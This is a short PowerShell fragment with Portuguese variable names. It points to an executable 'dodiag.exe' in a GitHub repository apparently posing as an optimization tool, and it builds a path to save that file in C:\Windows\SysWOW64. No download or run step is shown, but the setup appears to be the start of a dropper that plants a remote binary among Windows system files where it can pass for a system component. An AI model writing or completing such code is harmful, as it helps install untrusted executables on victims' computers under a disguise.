$diretorio = "C:\Windows\SysWOW64"
$url = "https://github.com/photoshopusermaker232/otimiza-ao/blob/main/dodiag.exe"
$caminhoArquivo = Join-Path -Path $diretorio -ChildPath "dodiag.exe"
